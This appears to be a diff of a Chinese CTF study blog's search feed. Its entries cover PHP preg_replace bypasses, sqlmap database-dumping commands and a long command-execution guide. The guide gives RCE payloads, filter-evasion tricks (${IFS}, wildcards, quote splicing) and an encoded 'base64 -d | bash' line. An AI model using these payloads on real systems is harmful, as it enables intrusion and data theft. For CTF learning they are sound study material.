-<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
-<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>函数绕过</tag>
       </tags>
   </entry>
   <entry>
@@ -357,6 +346,40 @@
       </tags>
   </entry>
   <entry>
+    <title>sqlmap</title>
+    <url>/2024/08/03/sqlmap/</url>
+    <content><![CDATA[<p>&emsp;&emsp;sqlmap是kali自带的一种工具，通常对网站进行sql注入，首先就要做的是找到注入点，找到后就可以使用sqlmap一把梭了。同时它也具备了一些脚本去使用，也可以搭配自定义脚本，理论上sql题目可以通杀的，看你的掌握度如何。常规指令有如下，实用指数:⭐⭐⭐⭐<br><img data-src="/images/sqlmap.png" alt="sqlmap"><br>&emsp;&emsp;经典一把梭</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> <span class="built_in">-batch</span>(爆库)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch -D <span class="string">&#x27;    &#x27;</span>(爆表)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>(爆列)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>  <span class="attr">--dump</span>(爆段)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>preg_replace</title>
+    <url>/2024/07/12/preg-replace/</url>
+    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
+<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
+<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tplmap</title>
     <url>/2024/06/06/tplmap/</url>
     <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
@@ -379,132 +402,6 @@
       </categories>
       <tags>
         <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqlmap</title>
-    <url>/2024/08/03/sqlmap/</url>
-    <content><![CDATA[<p>&emsp;&emsp;sqlmap是kali自带的一种工具，通常对网站进行sql注入，首先就要做的是找到注入点，找到后就可以使用sqlmap一把梭了。同时它也具备了一些脚本去使用，也可以搭配自定义脚本，理论上sql题目可以通杀的，看你的掌握度如何。常规指令有如下，实用指数:⭐⭐⭐⭐<br><img data-src="/images/sqlmap.png" alt="sqlmap"><br>&emsp;&emsp;经典一把梭</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> <span class="built_in">-batch</span>(爆库)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch -D <span class="string">&#x27;    &#x27;</span>(爆表)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>(爆列)</span><br><span class="line">sqlmap -u URL <span class="attr">--dbs</span> <span class="attr">--tables</span> -batch</span><br><span class="line">-D <span class="string">&#x27;   &#x27;</span>  -T  <span class="string">&#x27;   &#x27;</span>  <span class="attr">--dump</span>(爆段)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令执行</title>
-    <url>/2024/07/16/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<p>&emsp;&emsp;命令执行可以说是贯彻整个比赛的要点，不然你发现漏洞了都不知道怎么提取flag，别告诉我你只会F12，ctrl+U找(๑‾᷅^‾᷅๑)</p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;&emsp;这类知识点主要靠对函数和命令的熟练度和扩展度，能达成目的的方法不止一步，要掌握常见的函数和文件读取的命令，同时要学会如何利用一些特性去绕过黑名单。推荐去B站看橙子科技的视频，那里不止有命令执行的，希望对你有帮助。</p>
-<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>&emsp;&emsp;最常用的也是最好用的函数，通常能用system了就代表里找到flag不远了，最常规的用法就是<font color=blue>system(“ls”);</font>确认一下flag所在文件名，然后<font color=blue>system(“cat flag.php”);</font>注意：大多数情况下分号也是不能少的，因为这是一条语句。<br>&emsp;&emsp;当然也会出现找不到flag的现象，我们可以用<font color=red>system(“ls &#x2F;“);</font>去根目录找，也可以<font color=red>system(“env”);</font>调用环境变量去找，注意：有的题目flag所在的文件名不是flag.php，去找相类似的，或者很长很怪的文件名去试。在不济，就使用一句话木马连接蚁剑去翻，详情去木马那一章去看。</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><p>&emsp;&emsp;exec通常有两个参数，exec($command,$output),第一个参数输入要执行的命令，作为单独使用时只有最后一行的结果，且不会回显；第二个参数是将命令执行的输出填充此数组，逐行填充数组（二维数组），用法：使用var_dump或 print_r输出output里面的$变量。 例如：<font color=blue>print_r($output);</font></p>
-<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h4><p>&emsp;&emsp;一个参数，输入要执行的命令，会输出二进制的数据，并直接回显，且回显的是正常数据，和system一样好用，例如：<font color=blue>passthru(“ls”);</font></p>
-<h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>&emsp;&emsp;看到exec就要想到这是不回显的，但是区别就是它只有一个参数,用一个变量去接它，然后使用echo和print等输出结果，例如：<font color=red>$output &#x3D; shell_exec(‘ls’); echo $output;</font>  </p>
-<h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号` `"></a>反引号` `</h4><p>&emsp;&emsp;这个同shell_exec一样，也是用echo和print输出结果，它需要跟单引号‘’分清楚，反引号在数字1的左边那个才是，弄错了输出的结果肯定也不一样。建议自己去试一下。<br><img data-src="/images/%E5%8F%8D%E5%BC%95%E5%8F%B7.png" alt="反引号"> </p>
-<h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>&emsp;&emsp;两个参数popen($command,$mode),第一个参数输入命令，第二参数为模式，’r’表示阅读，’w’表示写入。同上面不同的是，有个open，这个有关文件，所以要先用fgets读取再用print_r输出，例如：  </p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">popen</span>($command,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span>($output=fgets($a))</span><br><span class="line">&#123;</span><br><span class="line">    print_r($output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;fgets只读取一行，因此需要靠循环遍历。这个不常遇到，可以先了解一下。</p>
-<h3 id="常见文件读取命令"><a href="#常见文件读取命令" class="headerlink" title="常见文件读取命令"></a>常见文件读取命令</h3><p>&emsp;&emsp;下面的命令建议打开你的kali或者linux去实践一下，印象更深更明白。在web下，要跟上面的函数搭配使用才是正解。  </p>
-<h4 id="ls和cat"><a href="#ls和cat" class="headerlink" title="ls和cat"></a>ls和cat</h4><p>&emsp;&emsp;最常用的一组命令，dddd  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure>
-
-<h4 id="tac"><a href="#tac" class="headerlink" title="tac"></a>tac</h4><p>&emsp;&emsp;与cat功能类似，只不过是反向显示（从表面上看就知道，就是cat的reverse）。例如：<font color=bule>tac flag.txt</font></p>
-<h4 id="more和less"><a href="#more和less" class="headerlink" title="more和less"></a>more和less</h4><p>&emsp;&emsp;more:一页一页的输出，等同cat，区别自己实践一下。<br>&emsp;&emsp;less: 同上。  </p>
-<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">more flag.php</span><br><span class="line"><span class="keyword">less</span> flag.php</span><br></pre></td></tr></table></figure>
-
-<h4 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h4><p>&emsp;&emsp; 显示文件的最后几行（默认显示最后10行），例如：<font color=red>tail flag.php</font>  </p>
-<h4 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h4><p>&emsp;&emsp;显示的时候，顺便输出行号,例如：<font color=blue>nl flag.php</font></p>
-<h4 id="od和xxd"><a href="#od和xxd" class="headerlink" title="od和xxd"></a>od和xxd</h4><p>&emsp;&emsp;od:以二进制的方式读取档案内容<br>&emsp;&emsp;xxd:读取二进制文件,很显然，有二进制，通常和passthru进行搭配使用</p>
-<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;od -A d -c flag.php&quot;</span>);</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=passthru(<span class="string">&quot;xxd flag.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>
-<p><img data-src="/images/xxd.png" alt="xxd"></p>
-<h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><p>&emsp;&emsp;主要用于排序文件，但也能达成目的，例如:<font color=red>sort flag.txt</font></p>
-<h4 id="uniq-file-f-grep"><a href="#uniq-file-f-grep" class="headerlink" title="uniq | file -f | grep"></a>uniq | file -f | grep</h4><p>&emsp;&emsp;uniq:报告或删除文件中重复的行<br>&emsp;&emsp;file -f:报错出具体内容<br>&emsp;&emsp;grep:在文本中查找指定的字符串<br><img data-src="/images/grep.png" alt="grep"></p>
-<h3 id="操作系统链接符"><a href="#操作系统链接符" class="headerlink" title="操作系统链接符"></a>操作系统链接符</h3><h4 id=""><a href="#" class="headerlink" title=";"></a>;</h4><p>&emsp;&emsp;这个应该都知道，代表这条语句的结束，后面可以继续跟命令，可以使多个命令按顺序执行，自行去kali试一下，例如<font color=red>id;ls;pwd</font></p>
-<h4 id="-1"><a href="#-1" class="headerlink" title="&amp;"></a>&amp;</h4><p>&emsp;&emsp;一样的效果，使命令在后台运行，这样就可以同时执行多条命令，注意在GET传参的时候<code>必须URL编码</code>,&amp;的URL为%26。例如<font color=blue>?c&#x3D;ls%26cat flag.php</font></p>
-<h4 id="-2"><a href="#-2" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h4><p>&emsp;&emsp;和逻辑与的语法一样，两边为命令的时候，前面的命令执行成功才会执行后面的命令，反之则不会执行后面的命令，同上，<code>必须URL编码</code>,例如<font color=red>?c&#x3D;ls%26%26cat flag.php</font></p>
-<h4 id="-3"><a href="#-3" class="headerlink" title="|"></a>|</h4><p>&emsp;&emsp;将前面命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；是不是看起来有点生涩？没关系，看个例题就明白了。<br>&emsp;&emsp;<font color=blue>echo “ls -l”</font>这个是只显示”ls -l”,而不是命令。<br>&emsp;&emsp;<font color=red>echo “ls -l” | &#x2F;bin&#x2F;bash</font>这个是&#x2F;bin&#x2F;bash把”ls -l”当成参数执行，也就是执行了ls -l这条命令。  </p>
-<h4 id="-4"><a href="#-4" class="headerlink" title="||"></a>||</h4><p>&emsp;&emsp;继承了逻辑或的语法，还有短路原则，换个更容易理解的就是相当于if else语句，若前面的命令执行成功，后面的命令就不会执行，反之执行后面的命令；例如<br>&emsp;&emsp;<font color=blue>ls || &gt;dev&#x2F;null 2&gt;&amp;1</font>后者相当于一个垃圾桶，你的所有输出都会被丢进去,”&gt;”代表的是重定向，还有2和1具体代表什么感兴趣的可以再去看一下，目前只要知道这样的格式代表的是垃圾桶就好。好，回归正题，如果没有||，作为顺序输出的话，就不会有回显；反之，ls正常输出，后面就不会执行了。</p>
-<h4 id="无参数命令执行"><a href="#无参数命令执行" class="headerlink" title="无参数命令执行"></a>无参数命令执行</h4><p>&emsp;&emsp;通俗来说就是函数里面没有有参数，比如phpinfo()是不是，里面没有参数照样能用，那么一些能利用的函数有哪些呢？？？</p>
-<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="built_in">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>])<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;像是正则里面的那两个就代表过滤了参数，就只能使用无参了。</p>
-<h5 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h5><p>&emsp;&emsp;返回所有已定义的<font color=yellow>变量的值</font>,然后对应成数组（注：如果有多个请求方法，返回数组的顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES），例如：定义了<font color=pink>cmd&#x3D;system(“ls”);</font>那么执行<font color=black>print_r(get_defined_vars());</font>时，将会回显<font color=red>[cmd]&#x3D;&gt;system(“ls);</font>这是我们就可以用<font color=green>pos来提取出参数里面的值system(“ls”)</font>,什么，你说没有变量怎么办？笨蛋，不知道自己编一个吗？我们可以这样</p>
-<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?code=print_r(<span class="keyword">end</span>(pos(get_defined_vars())));<span class="variable">&amp;cmd</span>=<span class="meta">system</span>(<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;注意只要后面的那个变量，用end提取(别问，问就是code我们也算变量啵，定义了两个变量就有两个数组，我们用后面那个cmd的)，这样就可以输出system(“ls”);同理，我们只要把print_r换成eval,assert就可以执行命令了，所以payload通常是:</p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?code=<span class="keyword">assert</span>(<span class="keyword">end</span>(pos(get_defined_vars())));&amp;cmd=<span class="keyword">system</span>(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-
-<h5 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h5><p>&emsp;&emsp;不解释了，看图<br><img data-src="/images/%E5%A4%A7%E6%9D%82%E7%83%A9.png" alt="scandir"><br>&emsp;&emsp;用法：</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">localeconv</span>()); <span class="comment">//查看当前目录文件名，形式同get_defined_vars的排列一样</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">current</span>(<span class="title">localeconv</span>())); <span class="comment">// 同pos，读取第一个数组的值</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>()))); <span class="comment">//读取当前目录（第一个数组所在目录）下的文件名</span></span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">aray_reverse</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())))); <span class="comment">//同<span class="doctag">end</span>的作用，如果flag在最后一个，倒转使它变成第一个，再用current对向它，show_source进行回显</span></span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;那么最终的payload就为：</p>
-<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">?code=show_source(<span class="literal">current</span>((aray_reverse(scandir(<span class="literal">current</span>(localeconv()))))))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;同理，getcwd()也可以达成目的，那么另一种的payload就为：</p>
-<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">?<span class="meta">code</span><span class="symbol">=show_source</span>(<span class="meta">end</span>(scandir(getcwd())))<span class="comment">;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;对照上面的函数，我们还可以用读取上一级目录的随机文件名(直到随机到flag即可)，payload如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(<span class="built_in">dirname</span>(<span class="built_in">chdir</span>(<span class="built_in">dirname</span>(getcwd())))))));</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;payload不是一成不变的，根据题目使用实用的函数，看你的熟练度如何了。<br>&emsp;&emsp;推荐博客：<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">无参RCE</a><br>&emsp;&emsp;推荐视频: <a href="https://www.bilibili.com/video/BV1tG4y1c7Vb/?spm_id_from=333.999.0.0&vd_source=fb821c5d64cc54f5e03e8f0c7ecb5672">橙子科技</a></p>
-<h5 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h5><p>&emsp;&emsp;这个难度系数有点高，可以自己去看视频实践一下，平常情况不推荐使用，失误率也蛮大的。</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="替换函数绕过"><a href="#替换函数绕过" class="headerlink" title="替换函数绕过"></a>替换函数绕过</h4><p>&emsp;&emsp;之所以介绍这么多常见的命令和函数就是为了达成这个目的，看黑名单内没有其中的哪些（个）函数和命令就可以用它实现一样的效果。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/exec/system/popen/proc_open|\`/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">   <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;很明显，对照上面的函数，还有passthru没有过滤，就可以使用该函数，<font color=blue>?c&#x3D;passthru(“ls”);</font></p>
-<h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>&emsp;&emsp;空格过滤是属于比较烦的一种，尤其在SQL注入中┻┻︵⁞&#x3D;༎ຶ﹏༎ຶ&#x3D;⁞︵┻┻，算了，我们先看这里的。</p>
-<h5 id="大括号"><a href="#大括号" class="headerlink" title="大括号{}"></a>大括号{}</h5><p>&emsp;&emsp;顾名思义就是用大括号将命令括起来，中间用，分割，例如<font color=red>{cat,flag.txt};</font>  </p>
-<h5 id="IFS-代替空格"><a href="#IFS-代替空格" class="headerlink" title="$IFS 代替空格"></a>$IFS 代替空格</h5><p>&emsp;&emsp;这个建议去kali用一下，原理就是Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符，既然是分隔符，就能起到空格的作用。通常能单纯的$IFS会被当作变量名，就加一对{}固定变量名所以就是${IFS}，例如<font color=blue>ls${IFS}-l</font><br>&emsp;&emsp;再者就是$IFS$9，后面加个$和{}类似，起截断作用，$9是当前系统shell进程的第九个参数，代表这空字符串，所以这也是一种,例如<font color=red>ls$IFS$9-l</font><br>&emsp;&emsp;这两个在题目中最常用也最好用了，要知道。  </p>
-<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>&emsp;&emsp;就是使用空格和制表符的URL编码代替空格，在执行是会自动转换为空格使用，%09（tab）%20（space），例如<font color=blue>cat%09flag.php</font>和<font color=red>cat%20flag.php</font></p>
-<h5 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;,&lt;&gt;"></a>重定向字符&lt;,&lt;&gt;</h5><p>&emsp;&emsp;上面也提过一嘴，就是把&lt;后面跟的文件取代键盘作为新的输入设备，具体原理我也不清楚（谁会了到时候指导我一下ヾ(❀╹◡╹)ﾉﾞ❀~），不推荐使用，用法1：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;flag.php</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;而这另一种用法较为广泛，例如题目中出现类似与shell_exec()这种函数没有回显的情况下，我们可以用重定向，将结果放入指定的文件中,用法2:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; 1.txt</span><br><span class="line"><span class="built_in">cat</span> /flag &gt; 2.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="特定字符过滤绕过"><a href="#特定字符过滤绕过" class="headerlink" title="特定字符过滤绕过"></a>特定字符过滤绕过</h4><p>&emsp;&emsp;这种过滤一般针对一些特定的字符，全过滤的在后面，比如flag这四个，或者f,l,a,g四个字符单独过滤，后者意味这不能有这四个字母的出现，前者只是它们不能连着，很显然，后者相对难处理些，那么，就看看有哪些方法吧。</p>
-<h5 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h5><p>&emsp;&emsp;通配符是整个操作系统都认可的一种形式，用来模糊搜索文件。只有这两个?和*<br>&emsp;&emsp;?可以代表任何<code>单个</code>字符串，来让系统自行继续匹配搜索。例如<font color=blue>cat fl?g.tx?</font><br>&emsp;&emsp;*可以进行模糊匹配，代表任何字符串，让系统自己猜我要什么- ̗̀(๑ᵔ⌔ᵔ๑)。例如<font color=red>cat f*</font>(如果有多个匹配结果会同时显示)</p>
-<h5 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h5><p>&emsp;&emsp;原理就是接一个’’或者””里面什么都没有默认空字符，然后系统再拼接在一起，例如<font color=blue>cat fl’’ag.ph””p</font></p>
-<h5 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h5><p>&emsp;&emsp;这个就是将特性字符去掉功能性，单纯表示为字符串，比如反引号，要想表现出来得在前面加, 比如”`“(这里我加了,只是你们看不到而已)同理，我们就可以用它将他们分隔开，在命令中同样有效，例如<font color=red>cat fl\ag.t\xt</font>  </p>
-<h5 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h5><p>&emsp;&emsp;上面就有提到，$9作为特殊的环境变量，代表着空字符，所以也可以用，例如<font color=blue>cat fl$9.txt</font>  </p>
-<h5 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h5><p>&emsp;&emsp; 之前不是说过操作系统链接符可以顺序嘛，我们就可以先自定义字符串，再拼接起来,例如<font color=red>a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.txt</font>  </p>
-<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>&emsp;&emsp;众所周知，目标服务器在识别到编码后会自动解码读取命令并执行，就可以绕过那个笨比检测了（Ｕ・ω・）⊃<br>&emsp;&emsp;比如最熟悉的base编码（64,32都可），将命令编码一下再传输就可以了。通常通过管道符执行命令。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> Y2FOIGZsYWcucGhw | <span class="built_in">base64</span> -d  | bash</span><br></pre></td></tr></table></figure>
-
-<h5 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h5><p>&emsp;&emsp;呐，又是这两个&gt;,&gt;&gt;。知道一下就可以（其实是我也不擅长doge），通常用来做长度限制绕过的，不常用。  </p>
